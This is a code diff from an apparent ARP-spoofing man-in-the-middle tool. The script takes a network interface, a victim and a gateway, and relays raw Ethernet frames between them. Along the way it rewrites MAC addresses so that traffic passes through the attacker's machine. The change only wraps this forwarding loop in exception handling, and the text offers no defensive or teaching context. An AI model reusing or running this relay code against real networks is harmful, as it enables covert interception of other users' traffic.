@@ -78,20 +78,23 @@ def main(IFACE, VICTIM, GATEWAY):
             # ignore frames we injected
             if src == a_mac:
                 continue
+            try:
+                if src == v_mac:
+                    # rewrite dst/src in-place and send
+                    new_frame = bytearray(frame)  # we need a mutable copy to send; small allocation unavoidable
+                    new_frame[0:6] = g_mac
+                    new_frame[6:12] = a_mac
+                    # send raw
+                    s.send(new_frame)
+                elif src == g_mac:
+                    new_frame = bytearray(frame)
+                    new_frame[0:6] = v_mac
+                    new_frame[6:12] = a_mac
+                    s.send(new_frame)
+                else:
+                    continue
+            except Exception as e:
+                print(e)
 
-            if src == v_mac:
-                # rewrite dst/src in-place and send
-                new_frame = bytearray(frame)  # we need a mutable copy to send; small allocation unavoidable
-                new_frame[0:6] = g_mac
-                new_frame[6:12] = a_mac
-                # send raw
-                s.send(new_frame)
-            elif src == g_mac:
-                new_frame = bytearray(frame)
-                new_frame[0:6] = v_mac
-                new_frame[6:12] = a_mac
-                s.send(new_frame)
-            else:
-                continue
     except KeyboardInterrupt:
         pass
